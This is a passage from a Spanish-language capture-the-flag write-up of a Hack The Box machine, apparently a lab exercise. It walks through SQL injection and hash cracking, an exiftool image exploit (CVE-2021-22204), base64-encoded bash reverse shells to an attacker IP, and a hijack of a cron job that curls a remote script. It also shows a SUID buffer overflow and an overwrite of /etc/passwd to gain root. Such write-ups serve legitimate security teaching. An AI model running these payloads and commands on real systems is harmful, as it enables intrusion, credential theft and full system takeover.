auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : developer@localhost\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+database()+order+by+'1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : logs\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;  Explotación de SQLi Para realizar la explotación más fácil, vamos a crear un script personalizado en Ruby llamado sqli.rb (explicación detallada aquí).\nEl script está diseñado para ser ejecutado por pasos. Primero, tenemos que enumerar las bases de datos existentes:\n$ ruby sqli.rb --get-dbs [*] Number of databases: 4. information_schema Overflow cmsmsdb logs  Ahora, debemos enumerar las tablas en cada base de datos. Vamos a comenzar por Overflow:\n$ ruby sqli.rb --db Overflow --get-tables [*] Number of tables in Overflow: 1. users  Solamente existe una tabla llamada users. Ahora podemos listar sus columnas:\n$ ruby sqli.rb --db Overflow --table users --get-columns [*] Number of columns in Overflow.users: 2. username password  Y finalmente, extraer los contenidos de ambas columnas:\n$ ruby sqli.rb --db Overflow --table users --columns username,password [*] Number of rows in Overflow.users: 1. +----------+----------------------------------+ | username | password | +----------+----------------------------------+ | admin | c71d60439ed5590b3c5e99d95ed48165 | +----------+----------------------------------+  Tenemos un hash de una contraseña. Por si acaso, vamos a examinar la base de datos llamada logs:\n$ ruby sqli.rb --db logs --get-tables [*] Number of tables in logs: 1. userlog $ ruby sqli.rb --db logs --table userlog --get-columns [*] Number of columns in logs.userlog: 3. id USERNAME Lastlogin  Y no hay nada interesante. Finalmente, podemos analizar la base de datos llamada cmsmsdb:\n$ ruby sqli.rb --db cmsmsdb --get-tables [*] Number of tables in cmsmsdb: 47. cms_additional_users cms_additional_users_seq cms_admin_bookmarks cms_admin_bookmarks_seq cms_adminlog cms_content cms_content_props cms_content_props_seq cms_content_seq ... cms_routes cms_siteprefs cms_user_groups cms_userplugins cms_userplugins_seq cms_userprefs cms_users cms_users_seq cms_version  Hay un montón de tablas. La más interesante es cms_users:\n$ ruby sqli.rb --db cmsmsdb --table cms_users --get-columns [*] Number of columns in cmsmsdb.cms_users: 10. user_id username password admin_access first_name last_name email active create_date modified_date  En esta tabla, parece que username y password serán útiles:\n$ ruby sqli.rb --db cmsmsdb --table cms_users --columns user_id,username,password,admin_access [*] Number of rows in cmsmsdb.cms_users: 2. +---------+----------+----------------------------------+--------------+ | user_id | username | password | admin_access | +---------+----------+----------------------------------+--------------+ | 1 | admin | c6c6b9310e0e6f3eb3ffeb2baff12fdd | 1 | | 3 | editor | e3d748d58b58657bfa4dffe2def0b1c7 | 1 | +---------+----------+----------------------------------+--------------+  Si tratamos de romper estos hashes (y el que encontramos antes), no podremos. Aquí tenemos que recordar que el exploit de ExploitDB estaba utilizando una sal almacenada en la base de datos (específicamente, en la tabla cms_siteprefs):\n$ ruby sqli.rb --db cmsmsdb --table cms_siteprefs --get-columns [*] Number of columns in cmsmsdb.cms_siteprefs: 4. sitepref_name sitepref_value create_date modified_date $ ruby sqli.rb --db cmsmsdb --table cms_siteprefs --columns sitepref_name,sitepref_value | head -7 [*] Number of rows in cmsmsdb.cms_siteprefs: 37. +---------------+------------------+ | sitepref_name | sitepref_value | +---------------+------------------+ | sitemask | 6c2d17f37e226486 | +---------------+------------------+  Y aquí tenemos la sal, ahora podemos romper los hashes. Para este propósito, usé un script sencillo en Python:\nimport hashlib salt = b'6c2d17f37e226486' wordlist = 'rockyou.txt' def crack(md5_hash): print('[+] Cracking hash:', md5_hash) with open(wordlist, 'rb') as f: for line in f.read().splitlines(): if hashlib.md5(salt + line).hexdigest() == md5_hash: print('[*] Password hash cracked:', line.decode()) break crack('c6c6b9310e0e6f3eb3ffeb2baff12fdd') crack('e3d748d58b58657bfa4dffe2def0b1c7') crack('c71d60439ed5590b3c5e99d95ed48165')  $ python3 crack.py [+] Cracking hash: c6c6b9310e0e6f3eb3ffeb2baff12fdd [+] Cracking hash: e3d748d58b58657bfa4dffe2def0b1c7 [*] Password hash cracked: alpha!@#$%bravo [+] Cracking hash: c71d60439ed5590b3c5e99d95ed48165  Y tenemos la contraseña del usuario editor: alpha!@#$%bravo.\nIntrusión en la máquina Estas credenciales son válidas para el CMS, tenemos acceso al panel de administración:\nEn el pie de página vemos que la versión del CMS es CMS Made Simple 2.2.8. Esto es útil para encontrar exploits. Existe un exploit de RCE (49345) al definir una nueva etiqueta en la sección de \u0026ldquo;Extensions\u0026rdquo;. Si vamos allí, vemos este mensaje:\nHay otro subdominio llamado devbuild-job.overflow.htb.\nAntes de enumerar el subdominio, podemos tratar de seguir las acciones listadas en el exploit para ganar ejecución remota de comandos, pero sin éxito. Por tanto, parece que no hay nada más que hacer aquí.\nSi vamos a http://devbuild-job.overflow.htb vemos otro formulario de inicio de sesión:\nEl mensaje del CMS decía que entráramos con las mismas credenciales, por lo que tenemos que usar otra vez editor:alpha!@#$%bravo:\nParece que hay mucho por hacer, pero que no cunda el pánico. La mayoría de botones y enlaces están deshabilitados. De hecho, la página web solo tiene una funcionalidad, que es la sección \u0026ldquo;Account\u0026rdquo;:\nSomos capaces de subir imágenes al servidor, pero de una manera peculiar. Si analizamos la respuesta con Burp Suite (Repeater), podemos ver una respuesta extraña:\nLa respuesta contiene la salida de ejecutar exiftool para extraer los metadatos de la imagen subida.\nLa versión de exiftool se muestra en el cuerpo de respuesta (11.92.) Existe una vulnerabilidad de ejecución remota de comandos (RCE) para exiftool por debajo de la versión 12.24 (CVE-2021-22204).\nSiguiendo los pasos mostrados en este blog, seremos capaces de ganar acceso a la máquina.\nPara crear la imagen del exploit, tenemos que instalar djvumake. Las instrucciones están en el blog:\n$ vim payload $ cat payload (metadata \"\\c${system('id')};\") $ bzz payload payload.bzz $ djvumake exploit.jpg INFO='1,1' BGjp=/dev/null ANTz=payload.bzz  Y si subimos exploit.jpg, veremos la salida del comando id en la respuesta:\nUna vez que tenemos RCE, podemos obtener acceso a la máquina utilizando una reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ vim payload $ cat payload (metadata \"\\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};\") $ bzz payload payload.bzz $ djvumake exploit.jpg INFO='1,1' BGjp=/dev/null ANTz=payload.bzz  Ahora subimos exploit.jpg y llega una conexión a nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.119. Ncat: Connection from 10.10.11.119:44332. bash: cannot set terminal process group (1019): Inappropriate ioctl for device bash: no job control in this shell www-data@overflow:~/devbuild-job/home/profile$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@overflow:~/devbuild-job/home/profile$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@overflow:~/devbuild-job/home/profile$ export TERM=xterm www-data@overflow:~/devbuild-job/home/profile$ export SHELL=bash www-data@overflow:~/devbuild-job/home/profile$ stty rows 50 columns 158  Movimiento lateral a developer Existen dos usuarios en /home:\nwww-data@overflow:~/devbuild-job/home/profile$ cd www-data@overflow:~$ pwd /var/www www-data@overflow:~$ ls /home developer tester  La flag user.txt está en /home/tester, y necesitamos ser tester para poder leerla. Por tanto, tenemos que realizar un movimiento lateral a tester:\nwww-data@overflow:~$ find / -name user.txt 2\u0026gt;/dev/null /home/tester/user.txt www-data@overflow:~$ ls -l /home/tester/user.txt -rw-r----- 1 root tester 33 Dec 31 14:28 /home/tester/user.txt  Como www-data podemos leer el código fuente PHP. Vamos a buscar por credentiales en texto claro:\nwww-data@overflow:~$ ls -la total 16 drwxr-xr-x 4 root root 4096 Sep 17 21:56 . drwxr-xr-x 14 root root 4096 Sep 17 21:56 .. drwxr-xr-x 5 www-data root 4096 Sep 29 22:03 devbuild-job drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 html www-data@overflow:~$ ls -la html total 56 drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 . drwxr-xr-x 4 root root 4096 Sep 17 21:56 .. drwxr-xr-x 9 www-data root 4096 Sep 29 20:12 admin_cms_panel drwxr-xr-x 5 www-data root 4096 Sep 29 02:38 assets drwxr-xr-x 2 www-data root 4096 Sep 29 20:12 config drwxr-xr-x 3 www-data root 4096 Sep 29 02:44 home -rwxr-xr-x 1 www-data root 12406 Sep 29 02:24 index.php -rwxr-xr-x 1 www-data root 2773 Sep 29 02:30 login.php -rwxr-xr-x 1 www-data root 269 May 26 2021 logout.php -rwxr-xr-x 1 www-data root 4251 Sep 29 02:31 register.php www-data@overflow:~$ ls -la html/config total 24 drwxr-xr-x 2 www-data root 4096 Sep 29 20:12 . drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 .. -rw-r--r-- 1 root root 418 May 25 2021 admin_last_login.js -rwxr-xr-x 1 www-data root 391 May 18 2021 auth.php -rwxr-xr-x 1 www-data root 315 May 28 2021 db.php -rwxr-xr-x 1 www-data root 3287 May 28 2021 users.php www-data@overflow:~$ cat html/config/db.php  \u0026lt;?php #define('DB_Server', 'localhost'); #define('DB_Username', 'root'); #define('DB_Password', 'root'); #define('DB_Name', 'Overflow'); $lnk = mysqli_connect(\"localhost\", \"developer\", \"sh@tim@n\", \"Overflow\"); $db = mysqli_select_db($lnk, \"Overflow\"); if ($db == false) { dir('Cannot Connect to Database'); } ?\u0026gt;  Y aquí tenemos la contraseña del usuario developer de MySQL. Afortunadamente, si tranamos de cambiar de usuario a developer usando sh@tim@n como contraseña, obtendremos acceso:\nwww-data@overflow:~$ su developer Password: $ echo $0 sh $ bash developer@overflow:/var/www$  Nótese que hemos entrado en /bin/sh en lugar de /bin/bash.\nMovimiento lateral a tester El usuario developer pertenece a un grupo llamado network:\ndeveloper@overflow:/var/www$ id uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)  Los miembros de este grupo pueden modificar /etc/hosts:\ndeveloper@overflow:/var/www$ find / -group network 2\u0026gt;/dev/null /etc/hosts developer@overflow:/var/www$ ls -l /etc/hosts -rwxrw-r-- 1 root network 201 Jan 1 08:20 /etc/hosts  Con este permiso, podemos añadir subdominios al DNS local de la máquina (esto es, el archivo /etc/hosts).\nComo necesitamos convertirnos en tester, vamos a ver si este usuario tiene algún archivo interesante:\ndeveloper@overflow:/var/www$ find / -user tester 2\u0026gt;/dev/null | grep -v proc /home/tester /home/tester/.cache /home/tester/.ssh /home/tester/.profile /home/tester/.gnupg /var/mail/tester /opt/commontask.sh  Hay un script en Bash llamado /opt/commontask.sh:\ndeveloper@overflow:/var/www$ cat /opt/commontask.sh  #!/bin/bash #make sure its running every minute. bash \u0026lt; \u0026lt;(curl -s http://taskmanage.overflow.htb/task.sh)  Parece que contiene una tarea Cron que solicita un archivo llamado task.sh desde http://taskmanage.overflow.htb y lo ejecuta con Bash.\nEn este punto, tenemos que añadir un subdominio llamado taskmanage.overflow.htb en el /etc/hosts de la máquina para que apunte a nuestra dirección IP de atacante. Luego, debemos alojar un archivo llamado task.sh para que sea descargado y ejecutado con Bash:\ndeveloper@overflow:/var/www$ vim /etc/hosts developer@overflow:/var/www$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overflow overflow.htb 10.10.17.44 taskmanage.overflow.htb # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters  $ vim task.sh $ cat task.sh  #!/bin/bash echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  $ python -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.119 - - [] \"GET /task.sh HTTP/1.1\" 200 -  Y si estamos escuchando con nc, onseguiremos acceso como tester:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.119. Ncat: Connection from 10.10.11.119:44534. bash: cannot set terminal process group (7907): Inappropriate ioctl for device bash: no job control in this shell tester@overflow:~$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null tester@overflow:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm tester@overflow:~$ export TERM=xterm tester@overflow:~$ export SHELL=bash tester@overflow:~$ stty rows 50 columns 158  En este punto, podemos capturar la flag user.txt:\ntester@overflow:~$ cat user.txt 9248cf7d566c232e4618be372f16fe38  Analizando un binario SUID Ahora que somos tester, podemos mirar si hay binarios SUID inusuales:\ntester@overflow:~$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/chsh /usr/bin/newuidmap /usr/bin/newgrp /usr/bin/newgidmap /usr/bin/chfn /usr/bin/pkexec /usr/bin/sudo /usr/bin/passwd /usr/bin/traceroute6.iputils /usr/bin/at /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/policykit-1/polkit-agent-helper-1 /bin/ping /bin/su /bin/umount /bin/mount /bin/fusermount /opt/file_encrypt/file_encrypt tester@overflow:~$ ls -l /opt/file_encrypt/file_encrypt -rwsr-xr-x 1 root root 11904 May 31 2021 /opt/file_encrypt/file_encrypt  Hay uno que parece interesante: /opt/file_encrypt/file_encrypt. Vamos a ver lo que hace:\ntester@overflow:~$ file /opt/file_encrypt/file_encrypt /opt/file_encrypt/file_encrypt: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ae0f5750a8f1ac38945f813b5e34ddc166daf57, not stripped tester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: 1 Wrong Pin  Hay más información relacionada en /opt/file_encrypt:\ntester@overflow:~$ ls -la /opt/file_encrypt/ total 24 drwxr-x---+ 2 root root 4096 Sep 17 21:56 . drwxr-xr-x 3 root root 4096 Sep 17 21:56 .. -rwsr-xr-x 1 root root 11904 May 31 2021 file_encrypt -rw-r--r-- 1 root root 399 May 30 2021 README.md tester@overflow:~$ cat /opt/file_encrypt/README.md Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now. The PIN should be in your inbox  El binario está programado para encriptar archivos, pero la función que encripta no se llama en el programa principal. Sin embargo, el código de esa función sigue estando compilado.\nPara analizar el binario, vamos a transferirlo a nuestra máquina:\ntester@overflow:~$ which python3 /usr/bin/python3 tester@overflow:~$ cd /opt/file_encrypt tester@overflow:~$ python3 -m http.server 1234 Serving HTTP on :: port 1234 (http://[::]:1234/) ... 10.10.17.44 - - [] \"GET /file_encrypt HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  $ curl 10.10.11.119:1234/file_encrypt -so file_encrypt  Ahora podemos usar Ghidra como herramienta de ingeniería inversa para descompilar el binario y ver el código fuente en C.\nEsta es la función main:\nint main() { check_pin(); return 0; }  Llama a check_pin, que es esta otra:\nvoid check_pin() { char local_2c[20]; int local_18; long local_14; int local_10; local_10 = rand(); local_14 = random(); printf(\"This is the code %i. Enter the Pin: \", local_10); __isoc99_scanf(\"%i\", \u0026amp;local_18); if (local_14 == local_18) { printf(\"name: \"); __isoc99_scanf(\"%s\", local_2c); puts(\"Thanks for checking. You can give your feedback for improvements at developer@overflow.htb\"); } else { puts(\"Wrong Pin\"); } return; }  El código almacenado en local_10 es siempre el mismo: 1804289383. El programa está comparando el valor guardado en local_14 con el PIN tomado de la entrada de usuario.\nEl número que está en local_14 es el resultado de la función llamada random, que es esta:\nlong random() { uint in_stack_00000004; uint local_c; int local_8; local_c = 0x6b8b4567; for (local_8 = 0; local_8 \u0026lt; 10; local_8 = local_8 + 1) { local_c = local_c * 0x59 + 0x14; } return local_c ^ in_stack_00000004; }  Aunque Ghidra no es capaz de mostrar el valor de la variable in_stack_00000004, podemos deducir que es 0x6b8b4567. Entonces podemos sacar cuál es el PIN esperado. Por ejemplo, en Python sería así:\n\u0026gt;\u0026gt;\u0026gt; local_c = 0x6b8b4567 \u0026gt;\u0026gt;\u0026gt; for _ in range(10): ... local_c = local_c * 0x59 + 0x14 ... \u0026gt;\u0026gt;\u0026gt; print(local_c ^ 0x6b8b4567) 56260846220404243151385449272  Sin embargo, si metemos este PIN, está mal:\n$ ./file_encrypt This is the code 1804289383. Enter the Pin: 56260846220404243151385449272 Wrong Pin  Aquí tenemos que darnos cuenta de que usa:\n__isoc99_scanf(\"%i\", \u0026amp;local_18);  Está leyendo un número entero (integer, no un long integer), por lo que tenemos que truncarlo a 32 bits:\n\u0026gt;\u0026gt;\u0026gt; print((local_c ^ 0x6b8b4567) \u0026 0xffffffff) 4091990840  Pero sigue estando mal:\n$ ./file_encrypt This is the code 1804289383. Enter the Pin: 4091990840 Wrong Pin  En este punto, vamos a usar GDB para depurar el programa y ver el valor esperado.\nPrimero, vamos a poner un breakpoint en la instrucción de comparación (cmp en ensamblador):\n$ gdb -q file_encrypt Reading symbols from file_encrypt... (No debugging symbols found in file_encrypt) gef➤ run Starting program: ./file_encrypt This is the code 1804289383. Enter the Pin: ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  gef➤ disassemble check_pin Dump of assembler code for function check_pin: ... 0x56555afd \u0026lt;+77\u0026gt;: push eax 0x56555afe \u0026lt;+78\u0026gt;: call 0x565556c0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x56555b03 \u0026lt;+83\u0026gt;: add esp,0x10 0x56555b06 \u0026lt;+86\u0026gt;: mov eax,DWORD PTR [ebp-0x14] 0x56555b09 \u0026lt;+89\u0026gt;: cmp DWORD PTR [ebp-0x10],eax 0x56555b0c \u0026lt;+92\u0026gt;: jne 0x56555b4a \u0026lt;check_pin+154\u0026gt; ... End of assembler dump. gef➤ break *0x56555b09 Breakpoint 1 at 0x56555b09  Ahora continuamos el programa, ponemos un PIN cualquiera y leemos el valor en $ebp-0x10:\ngef➤ continue Continuing. 1 Breakpoint 1, 0x56555b09 in check_pin ()  gef➤ x $ebp-0x10 0xffffd078: 0xf3e6d338  Contiene el valor 0xf3e6d338, que es 4091990840 en decimal. Esto es extraño, ya que es el valor que probamos antes.\nEl truco aquí es que el valor empieza por 0xf, que significa que el bit más significativo es un 1. Si esto ocurre, entonces el número es negativo. Para calcular el valor negativo, tenemos que calcular el complemento a dos de 0xf3e6d338, que es:\n\u0026gt;\u0026gt;\u0026gt; (~0xf3e6d338 \u0026 0xffffffff) + 1 202976456  Otra manera de encontrar este valor es con GDB, expresando el valor como integer (formato d):\ngef➤ p/d 0xf3e6d338 $1 = -202976456  Ahora probamos con -202976456, y funciona:\ntester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name:  Explotación de Buffer Overflow Vamos a revisar qué hace la función check_pin cuando el PIN es correcto:\nvoid check_pin() { char local_2c[20]; // ... if (local_14 == local_18) { printf(\"name: \"); __isoc99_scanf(\"%s\", local_2c); puts(\"Thanks for checking. You can give your feedback for improvements at developer@overflow.htb\"); } else { puts(\"Wrong Pin\"); } return; }  El problema aquí es que está leyendo una cadena de caracteres con scanf (__isoc99_scanf) y un formato %s. Esto es vulnerable a Buffer Overflow porque local_2c tiene 20 bytes asignados como buffer y scanf permite cualquier cadena de caracteres (%s) con cualquier longitud. Vamos a probarlo:\ntester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Segmentation fault (core dumped)  Parece que tenemos que explotar la vulnerabilidad de Buffer Overflow. Pero primero, vamos a ver si el binario tiene alguna protección habilitada:\ngef➤ checksec [+] checksec for './file_encrypt' Canary : ✘ NX : ✓ PIE : ✓ Fortify : ✘ RelRO : Full  Tiene NX habilitado (por lo que la pila no es ejecutable) y también PIE habilitado (que significa que las direcciones del binario se aleatorizan si ASLR está habilitado). Antes de continuar, vamos a ver si ASLR está habilitado:\ntester@overflow:~$ cat /proc/sys/kernel/randomize_va_space 0  Y no está habilitado, por lo que la protección PIE no hace nada. Si fuera un 2, entonces ASLR sí estaría habilitado.\nCon un Buffer Overflow podemos tomar control del registro $eip, que es el registro Extended Instruction Pointer. Este registro contiene la dirección de la siguiente instrucción a ejecutar. De hecho, el programa se rompió antes porque hemos sobrescrito $eip con 0x41414141 (AAAA), que es una dirección de memoria no válida.\nAhora que sabemos que ASLR está deshabilitado, podemos deshabilitarla en nuestra máquina para depurar el programa con GDB:\n# echo 0 | tee /proc/sys/kernel/randomize_va_space 0  Para explotar el Buffer Oveflow, tenemos que obtener el número de caracteres necesarios para sobrescribir la dirección de retorno, para poner un valor concreto ahí. Para ello, vamos a usar un patrón:\n$ gdb -q file_encrypt Reading symbols from file_encrypt... (No debugging symbols found in file_encrypt) gef➤ pattern create 60 [+] Generating a pattern of 60 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x6161616c in ?? ()  gef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 44 (little-endian search) likely [+] Found at offset 41 (big-endian search)  Y vemos que el offset es 44, por lo que necesitamos 44 caracteres para sobrescribir la dirección de retorno. Vamos a probarlo:\ngef➤ run Starting program: ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x45444342 in ?? ()  Y se muestra que la siguiente instrucción está en la dirección 0x45444342 (BCDE en little-endian), por lo que tenemos control sobre $eip.\nEn Ghidra, podemos encontrar el código de una función llamada encrypt y su dirección. Recordemos que ASLR está deshabilitado y que PIE no tiene efecto, por lo que la dirección de encrypt es estática:\ngef➤ x encrypt 0x5655585b \u0026lt;encrypt\u0026gt;: 0x53e58955  Y la dirección de encrypt es 0x5655585b. Curiosamente, estos bytes son imprimibles. En formato little-endian, la dirección de encrypt es lo mismo que [XUV:\n\u0026gt;\u0026gt;\u0026gt; '\\x5b\\x58\\x55\\x56' '[XUV'  Entonces, podemos poner esta dirección en $eip para llamar a encrypt:\ntester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File:  En este punto ya hemos explotado el Buffer Overflow para llamar a la función que no estaba en el programa principal.\nEscalada de privilegios Vamos a ver el código fuente de encrypt con Ghidra:\nvoid encrypt(char *__block,int __edflag) { int iVar1; int *piVar2; char *pcVar3; undefined4 local_98 = 0; undefined4 local_94 = 0; undefined4 local_90 = 0; undefined4 local_8c = 0; undefined4 local_88 = 0; undefined4 local_84 = 0; undefined4 local_80 = 0; undefined4 local_7c = 0; undefined4 local_78 = 0; undefined4 local_74 = 0; stat local_70; uint local_18; FILE *local_14; FILE *local_10;  printf(\"Enter Input File: \"); __isoc99_scanf(\"%s\", \u0026amp;local_84); printf(\"Enter Encrypted File: \"); __isoc99_scanf(\"%s\", \u0026amp;local_98); iVar1 = stat((char *) \u0026amp;local_84, \u0026amp;local_70); if (iVar1 \u0026lt; 0) { piVar2 = __errno_location(); pcVar3 = strerror(*piVar2); fprintf(stderr, \"Failed to stat %s: %s\\n\", \u0026amp;local_84, pcVar3); /* WARNING: Subroutine does not return */ exit(1); } if (local_70.st_uid == 0) { fprintf(stderr, \"File %s is owned by root\\n\", \u0026amp;local_84); /* WARNING: Subroutine does not return */ exit(1); } sleep(3); local_10 = fopen((char *) \u0026amp;local_84, \"rb\"); if (local_10 == (FILE *) 0x0) { piVar2 = __errno_location(); pcVar3 = strerror(*piVar2); fprintf((FILE *) \"cannot open input file %s: %s\\n\", (char *) \u0026amp;local_84, pcVar3); } else { local_14 = fopen((char *) \u0026amp;local_98, \"wb\"); if (local_14 == (FILE *) 0x0) { piVar2 = __errno_location(); pcVar3 = strerror(*piVar2); fprintf((FILE *) \"cannot open output file %s: %s\\n\", (char *) \u0026amp;local_98, pcVar3); fclose(local_10); } else { while (true) { local_18 = _IO_getc(local_10); if (local_18 == 0xffffffff) break; _IO_putc(local_18 ^ 0x9b, local_14); } fclose(local_10); fclose(local_14); } } return; }  Básicamente, lo que hace es coger un archivo, cifrarlo y escribirlo en otro archivo. Vamos a probarlo:\ntester@overflow:~$ cd /tmp tester@overflow:/tmp$ mkdir .test tester@overflow:/tmp$ cd .test tester@overflow:/tmp/.test$ echo asdf  t tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: /tmp/.test/t Enter Encrypted File: /tmp/.test/t_enc Segmentation fault (core dumped) tester@overflow:/tmp/.test$ ls -l --time-style=+ total 8 -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 root tester 5 t_enc tester@overflow:/tmp/.test$ xxd t 00000000: 6173 6466 0a asdf. tester@overflow:/tmp/.test$ xxd t_enc 00000000: fae8 fffd 91 .....  Y el programa ha escrito el archivo t_enc, que pertenece al usuario root.\nEn el código fuente descompilado, descubrimos que el tipo de cifrado es XOR byte a byte con una clave 0x9b:\nwhile (true) { local_18 = _IO_getc(local_10); if (local_18 == 0xffffffff) break; _IO_putc(local_18 ^ 0x9b, local_14); }  Para descifrar el archivo, solamente tenemos que usar XOR byte a byte con la misma clave 0x9b. Por ejemplo, podemos coger el volcado en hexadecimal del archivo t_enc y aplicarle la operación XOR con la clave:\n\u0026gt;\u0026gt;\u0026gt; hex(0xfae8fffd91 ^ 0x9b9b9b9b9b) '0x617364660a'  Y obtenemos asdf (en hexadecimal), que son los contenidos del archivo t.\nHay una validación sobre el archivo que queremos cifrar: no puede ser de root. Sin embargo, no hay validación sobre el archivo de salida, por lo que tenemos permisos de escritura como root.\nTeniendo esto, podemos añadir una clave pública de SSH en /root/.ssh/authorized_keys o sobrescribir /etc/passwd para indicar una contraseña para root en formato DES Unix. Esta vez, vamos con la segunda opción.\nVeamos esto:\ntester@overflow:/tmp/.test$ cp t_enc t2 tester@overflow:/tmp/.test$ ls -l --time-style=+ total 12 -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 tester tester 5 t2 -rw-rw-r-- 1 root tester 5 t_enc tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: /tmp/.test/t2 Enter Encrypted File: /tmp/.test/t2_enc Segmentation fault (core dumped) tester@overflow:/tmp/.test$ ls -l --time-style=+ total 16 -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 tester tester 5 t2 -rw-rw-r-- 1 root tester 5 t_enc -rw-rw-r-- 1 root tester 5 t2_enc tester@overflow:/tmp/.test$ cat t2_enc asdf  Hemos cifrado el archivo que ya habíamos cifrado (t2 es una copia de t_enc, pero perteneciente a tester y no a root), y la salida del archivo doblemente cifrado es lo mismo que el archivo original t (que era asdf). Pues este es el truco, tenemos que escribir un archivo, cifrarlo, copiarlo y cifrarlo otra vez. El resultado del segundo proceso de cifrado estará en texto claro.\nVamos a modificar una copia de /etc/passwd con sed:\ntester@overflow:/tmp/.test$ which openssl /usr/bin/openssl tester@overflow:/tmp/.test$ openssl passwd 7rocky OO3PvAT9Z8SvU tester@overflow:/tmp/.test$ cp /etc/passwd p1 tester@overflow:/tmp/.test$ head -1 p1 root:x:0:0:root:/root:/bin/bash tester@overflow:/tmp/.test$ sed -i 's/root:x/root:OO3PvAT9Z8SvU/' p1 tester@overflow:/tmp/.test$ head -1 p1 root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash  Hemos cambiado la x por OO3PvAT9Z8SvU. Esto provoca que al hacer su root se compara la contraseña insertada en formato DES Unix con OO3PvAT9Z8SvU y no con el hash en /etc/shadow.\nVamos a cifrar p1 la primera vez:\ntester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: p1 Enter Encrypted File: p1_enc 